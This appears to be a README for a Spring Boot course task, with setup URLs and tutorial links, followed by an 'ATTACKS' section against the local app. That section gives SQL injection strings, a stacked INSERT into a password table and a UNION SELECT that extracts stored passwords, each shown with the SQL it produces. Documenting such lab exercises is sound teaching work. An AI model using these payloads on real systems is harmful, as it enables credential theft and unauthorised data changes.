#Spring Advanced #57 Task 4

REST API

##To start use
http://localhost:8084/

@@H2 console
http://localhost:8084/h2-console


##Thanks to FreeMarker tutorial
http://zetcode.com/springboot/freemarker/

##PDF
http://zetcode.com/articles/springbootpdfreport/

##Exception
https://spring.io/blog/2013/11/01/exception-handling-in-spring-mvc


##PDF with itextpdf
https://www.logicbig.com/tutorials/spring-framework/spring-web-mvc/pdf-view.html


##PDF with HMC
https://www.logicbig.com/tutorials/spring-framework/spring-web-mvc/custom-http-message-converter.html


##PDF - Spring MVC
https://www.tutorialspoint.com/springmvc/springmvc_pdf.htm
https://www.baeldung.com/spring-httpmessageconverter-rest





#Exam
5
http://www.k-press.ru/cs/2009/1/ts/ts.asp




***************************************************************************************
*****************************          ATTACKS             *******************************
***************************************************************************************
# SQL injections attacks
1) Inserting data into any table
* SQL injection
Attack vector: http://localhost:8084/editUser?userId=1
    Field: any text field - i.e. Phone Operator
* attack string
    ';  INSERT INTO usersPasswords(name, password) VALUES('Leo333', '333Password'); --
Resulting SQL _________________________________________________________________________**********************************************************************************_____________________________
    UPDATE users SET  name = 'Ivan', phoneNumber = '233234234', phoneOperator = 'Orange';  INSERT INTO usersPasswords(name, password) VALUES('Leo333', '333Password'); --', balance = 43200 WHERE id=1;


2) Enumerating data from any table by 1 row
* SQLi UNION
Attack vector: http://localhost:8084/api/user/1
    Field - 1
* attack string
    ' UNION SELECT id, name, password, password, id FROM usersPasswords LIMIT 1,1--'
    '%20UNION%20SELECT%20id,%20name,%20password,%20password,%20id%20FROM%20usersPasswords%20LIMIT%202,1--'
Resulting SQL _____________________********************************************************************************_
    SELECT * FROM users WHERE id='1' UNION SELECT id, name, password, password, id FROM usersPasswords LIMIT 1,1--''
